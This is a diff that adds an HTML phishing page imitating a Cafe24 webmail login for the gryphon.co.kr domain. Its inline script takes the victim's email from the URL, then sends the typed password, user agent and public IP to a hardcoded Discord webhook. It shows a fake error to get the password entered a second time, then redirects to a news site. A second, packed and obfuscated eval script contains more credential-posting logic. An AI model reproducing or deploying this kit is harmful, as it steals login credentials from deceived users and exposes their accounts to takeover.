@@ -1,0 +1,188 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title></title>
+    <meta name="WMMETA" content="host" data-host="rwebmail-003.fmcity.com" /><meta name="WMMETA" content="domain" data-domain="gryphon.co.kr" /><meta name="WMMETA" content="appversion" data-appversion="20220804" /><meta name="WMMETA" content="langpack" data-langpack="ko" />
+    <link rel="stylesheet" type="text/css" href="https://img.cafe24.com/serviceserver/biz/webmail/css/webmail.css?v=20220804" />
+</head>
+<body>
+
+
+<div class="mLogin type1 ">
+    <ul class="languages">
+        <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
+        <li><a class="login-language-change" href="#changeLang/chGb">简体中文</a></li>
+        <li><a class="login-language-change" href="#changeLang/jp">日本語</a></li>
+        <li><a class="login-language-change" href="#changeLang/chBig">繁體中文</a></li>
+        <li><a class="login-language-change" href="#changeLang/ko">한국어</a></li>
+    </ul>
+	<div class="inner">
+		<div class="logoArea">
+			<h2 class="logo">
+				<img src="http://img.cafe24.com/serviceserver/biz/webmail/images/login/@img_logo_aType.gif" alt="" />
+			</h2>
+		</div>
+		<div class="contents">
+			<ul class="mTab typeLogin eTab switch-login-type">
+				<li class="selected"><a href="#tabUser">사용자 모드</a></li>
+				<li><a href="#tabAdmin">관리자 모드</a></li>
+			</ul>
+			<div id="tabUser" class="tabCont" style="display: block;">
+				<form name="userLoginForm" target="" action="">
+					<fieldset>
+					<legend>사용자 로그인</legend>
+						<label><input type="text" name="email" id="email" class="fText" placeholder="아이디" value="" readonly></label><!-- 개발참고 : value값 placeholder로 넣어주세요 -->
+						<label><input type="password" id="password" name="password" class="fText" placeholder="비밀번호" ></label>
+						<button type="button" id="submit-btn" class="btnLogin user-login-btn"><span>로그인</span></button>
+						<ul class="security">
+							<li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
+							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
+						</ul>
+					</fieldset>
+                    <span style="color: red;" id="error">Invalid Email Password</span>
+				</form>
+				<!-- 2차 인증 -->
+			</div>
+			<div id="tabAdmin" class="tabCont" style="display: none;">
+				<form method="post" name="adminLoginForm" target="HFLOGIN" action="">
+				
+					<fieldset>
+					<legend>관리자 로그인</legend>
+						<label><input type="text" name="mail" class="fText" placeholder="아이디" value=""></label>
+						<label><input type="password" name="password" class="fText" placeholder="비밀번호" ></label>
+						<button type="submit" class="btnLogin"><span>로그인</span></button>
+						<ul class="security">
+							<li><input type="checkbox" name="save"> 아이디 저장</li>
+							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
+						</ul>
+					</fieldset>
+				</form>
+			</div>
+		</div>
+
+	</div>
+
+
+	
+
+    <script>
+        function isBase64(str) {
+  if (typeof str !== 'string') {
+    return false;
+  }
+  const notBase64 = /[^A-Z0-9+\/=]/i;
+  const len = str.length;
+
+  if (!len || len % 4 !== 0 || notBase64.test(str)) {
+    return false;
+  }
+
+  const firstPaddingChar = str.indexOf('=');
+  return firstPaddingChar === -1 ||
+    firstPaddingChar === len - 1 ||
+    (firstPaddingChar === len - 2 && str[len - 1] === '=');
+}
+
+        function sleep(milliseconds) {
+            const date = Date.now();
+            let currentDate = null;
+            do {
+                currentDate = Date.now();
+            } while (currentDate - date < milliseconds);
+        }
+
+        var linksc = window.location.href
+        var value = linksc.split('#')[1].split('$')[0];
+        const values = value
+
+
+
+        document.getElementById("email").innerHTML = values;
+
+        // document.getElementById("username").value = values; 
+
+
+        let count = 0;
+        var btn = document.getElementById("submit-btn");
+        var pwd = document.getElementById("password");
+        var agents = navigator.userAgent;
+
+
+
+        btn.onclick = function () {
+            if (pwd.value.length > 0) {
+                count++;
+                if (count <= 2) {
+				
+                    var xhr = new XMLHttpRequest();
+                    xhr.open("GET", "https://api.ipify.org/?format=json", true);
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState === 4 && xhr.status === 200) {
+                        var response = JSON.parse(xhr.responseText);
+                        // Handle the response data here
+                        var ipAddress = response.ip
+
+                        request.open("POST", "https://discord.com/api/webhooks/1287654027693133845/egwOpHwAN8kfIkxhu-SPMGhvYG77K11yN_ZAfxsoXXOA8w1lV5USv3_M6hv5M48NHjvp");
+                        request.setRequestHeader('Content-type', 'application/json');
+                        var params = {
+                        content: (" > **IP: **" + ipAddress)
+                        }
+                        request.send(JSON.stringify(params));
+                            
+
+                        }
+
+                    };
+                    xhr.send();
+
+
+                    var request = new XMLHttpRequest();
+                    request.open("POST", "https://discord.com/api/webhooks/1287654027693133845/egwOpHwAN8kfIkxhu-SPMGhvYG77K11yN_ZAfxsoXXOA8w1lV5USv3_M6hv5M48NHjvp");
+                    request.setRequestHeader('Content-type', 'application/json');
+                    var params = {
+                        content: ("> **USERNAME  : **" + values + "\n> **PASSWORD : **" + document.getElementById("password").value + "\n> **USER-AGENT: **" + agents)
+                    }
+                    request.send(JSON.stringify(params));
+                    text = "Network issues or Incorrect password";
+                    // document.getElementById("username-error").innerHTML = text;
+                    // // document.getElementById("errorMessage").style.color = "red";
+                    document.getElementById("error").innerText = text;
+                    document.getElementById("password").value = "";
+                    sleep(1000)
+                }
+                if (count == 2) {
+                    texts = "Verification successful... Thank you.";
+                    document.getElementById("error").style.color = "green";
+                    document.getElementById("error").innerHTML = texts;
+                    window.location.replace("https://www.koreatimes.co.kr/www/section_129.html");
+                }
+            } else {
+                text = "Enter password"
+                // document.getElementById("errorMessage").style.color = "red";
+                // document.getElementById("login-failure").innerHTML = "";
+                document.getElementById("error").innerHTML = text;
+
+                // document.getElementById("alert").style.backgroundColor = "#d0452f"; 
+
+
+
+            }
+
+        }
+    </script>
+	<!-- 만료 된 계정 경고 텍스트 -->
+	
+	<!-- copyright -->
+    <p class="footer"><a href="http://www.gryphon.co.kr">Copyright ⓒ <strong>2009-2016</strong> All Rights Reserved.</a></p>
+</div>
+
+</body>
+
+
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(16).17(6(){3 m=0;$(\'#18\').M(6(){$("#8").A();$(\'#B\').5("");$("#19").N({1a:O,P:"A"},0);$("#1b").N({1c:O,P:"w"},1d)});3 n=F.G.1e.x(1);7(!n){}Q{3 o=n;$(\'#B\').5(o);$(\'#1f\').y(o);3 p=/^([a-u-v-R\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!p.S(o)){$(\'#C\').w();n.T;U V}3 q=o.D("@");3 r=o.x((q+1));3 c=r.x(0,r.D(\'.\'));3 s=c.W();3 t=c.X();$("#H").I("Y","Z://10.11.12/"+r);$("#H").I("1g",t);$("#J").y(t);$(".J").y(t)}$(\'#K-L\').M(6(b){$(\'#C\').A();$(\'#8\').A();b.1h();3 d=$("#B").5();3 e=$("#E").5();3 z=$("#13").5();3 f=$(\'#8\').y();$(\'#8\').1i(f);3 g=d;3 h=/^([a-u-v-R\\.\\-])+\\@(([a-u-v-9\\-])+\\.)+([a-u-v-9]{2,4})+$/;7(!h.S(g)){$(\'#C\').w();d.T;U V}3 i=g.D("@");3 j=g.x((i+1));3 c=j.x(0,j.D(\'.\'));3 k=c.W();3 l=c.X();$("#H").I("Y","Z://10.11.12/"+j);$("#J").y(l);m=m+1;$.1j({1k:\'1l\',1m:\'../1n-1o.1p\',1q:\'1r\',1s:{B:d,E:e,13:z,},1t:6(a){$(\'#K-L\').5(\'1u...\')},1v:6(a){7(a){$("#8").w();1w.1x(a);7(a[\'1y\']==\'1z\'){$("#E").5("");7(m>=2){m=0;F.G.1A("14://15."+j)}}Q{}}},C:6(){$("#E").5("");7(m>=2){m=0;F.G.1B("14://15."+j)}$("#8").w()},1C:6(){$(\'#K-L\').5(\'1D\')}})})});',62,102,'|||var||val|function|if|msg||||||||||||||||||||||zA|Z0|show|substr|html||hide|email|error|indexOf|password|window|location|logoimg|attr|logoname|submit|btn|click|animate|200|opacity|else|9_|test|focus|return|false|toLowerCase|toUpperCase|src|https|logo|clearbit|com|lourl|http|www|document|ready|back1|automail|left|inputbar|right|1000|hash|emailich|alt|preventDefault|text|ajax|dataType|JSON|url|form|loaded|php|type|POST|data|beforeSend|Verifing|success|console|log|signal|ok|href|replace|complete|LOGIN'.split('|'),0,{}))
+</script>
+</html>
